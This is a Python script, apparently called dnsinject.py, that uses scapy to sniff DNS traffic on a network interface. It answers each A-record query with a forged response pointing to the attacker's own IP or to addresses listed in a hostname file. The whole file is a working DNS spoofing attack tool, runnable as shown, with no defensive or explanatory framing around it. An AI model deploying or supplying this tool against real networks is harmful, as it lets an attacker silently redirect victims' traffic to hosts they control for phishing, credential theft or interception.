import dpkt
from scapy.all import *
import argparse
import netifaces as ni


def dns_sniff(packet):
	dns_seg = packet[DNS]
	if (dns_seg.qr == dpkt.dns.DNS_Q and dns_seg.opcode == dpkt.dns.DNS_QUERY and dns_seg.qdcount == 1 and
				dns_seg.nscount == 0 and dns_seg.ancount == 0 and
				dns_seg.qd[0].qclass == dpkt.dns.DNS_IN and dns_seg.qd[0].qtype == dpkt.dns.DNS_A and IP in packet):

		packet[DNS].summary()
		victim_host_name = packet[DNSQR].qname.rstrip('.')
		if hostname is None :
			host_ip = ni.ifaddresses(interface)[ni.AF_INET][0]['addr']
		elif victim_host_name in hostdict:
			host_ip = hostdict[victim_host_name]
		else:
			return
		spoofedPacket = IP(dst=packet[IP].src, src=packet[IP].dst) / UDP(sport=53, dport=packet[UDP].sport) / \
					  DNS(id=dns_seg.id, qr=1, rd=1, ra=1, ancount=1, qdcount=1, qd=dns_seg.qd[0], \
						  an=DNSRR(rclass=1, ttl=100, rrname=dns_seg.qd[0].qname, rdata=host_ip, type=1))
		send(spoofedPacket)


def arg_parser():
	parser = argparse.ArgumentParser('dnsinject.py', add_help=False)
	parser.add_argument("-i", metavar="<Interface>")
	parser.add_argument("-h", metavar="<hostname file>", dest='hi')
	parser.add_argument('expression',nargs='*', action="store")
	args = parser.parse_args()
	return args.i, args.hi, args.expression


if __name__ == '__main__':
	interface, hostname, expression = arg_parser()
	bpf_expression = 'udp port 53'
	try:
		if interface is None:
			interface = conf.iface
		if hostname:
			hostdict ={}
			# global hostdict
			with open(hostname) as f:
				for line in f:
   					(hip, hname) = line.split()
   					hostdict[hname] = hip
		if expression:
			bpf_expression += ' and ' + ''.join(expression)
		try:
			sniff(iface=interface, filter = bpf_expression, store=0, prn=dns_sniff)
		except :
			print ("Filter Parse Error . Please give a valid filter expression")

	except AttributeError:
		print "Usage : dnsinject [-i interface] [-h hostnames] expression"